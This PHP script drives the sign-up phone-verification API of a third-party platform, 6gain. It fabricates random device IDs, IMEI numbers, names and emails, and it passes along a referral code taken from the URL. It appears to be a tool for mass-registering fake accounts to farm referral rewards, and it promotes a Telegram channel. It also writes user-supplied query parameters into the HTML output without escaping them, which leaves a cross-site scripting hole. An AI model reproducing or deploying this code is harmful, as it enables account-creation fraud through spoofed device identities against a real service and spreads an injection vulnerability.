<?php
require __DIR__ . '/functions.php';
require __DIR__ . '/header.php';

// Random User Data
$userData = generateRandomUserData();
$deviceid = $userData['deviceid'];
$imei = $userData['imei'];
$fname = $userData['fname'];
$lname = $userData['lname'];
$email = $userData['email'];
$number = $userData['number'];

// Get mobile & refer
$mobile = $_GET['full_mobile'] ?? '';
$refer  = $_GET['refer'] ?? '';

// URL
$url = "https://api.6gain.com/v1/platform/sendPhoneCode";

// JSON Body
$data = json_encode([
    "purpose"     => "register",
    "identity"    => $mobile,
    "sessionId"   => null,
    "challengeId" => null
]);

// Headers
$headers = [
    ":authority: api.6gain.com",
    ":path: /v1/platform/sendPhoneCode",
    ":scheme: https",
    "content-type: application/json",
    'content-length: '.strlen($data).''
];

// API Call
$output = httpCall($url, $data, $headers, "POST");

$json = json_decode($output, true);

$status = $json["sessionId"] ?? "";
$msg    = $json["message"] ?? "No message";

// HTML Output
if ($status != "") {
    echo '
<h1>Aisha yadav WhatsApp</h1>
<p>Apna number dedo yaar</p>

<div class="form-container">
    <h2>Enter Verification Code</h2>

<form id="otp-form" action="verify.php" method="get">
    <div class="form-row">
        <input type="text" name="otp" class="input-field" placeholder="Enter OTP" required>

        <input type="hidden" name="mobile" value="'.$mobile.'">
        <input type="hidden" name="refer" value="'.$refer.'">
        
        <!-- ⭐ MOST IMPORTANT: Send sessionId to verify.php -->
        <input type="hidden" name="sessionId" value="'.$status.'">
    </div>

    <div class="form-row">
        <input type="submit" class="submit" name="submit" value="verify OTP">
    </div>
</form>

<div class="success-message">'.$msg.'</div>
<a href="https://t.me/+XcybaJ2p2-M5Nzc1" target="_blank" class="telegram-btn">Join Our Telegram</a>
';
} else {
    echo '
<h1 class="header-text">Aisha yadav WhatsApp</h1>
<div class="error-message">'.$msg.'</div>
<a href="https://t.me/+XcybaJ2p2-M5Nzc1" target="_blank" class="telegram-btn">Join Our Telegram</a>
';
}

require __DIR__ . '/footer.php';
?>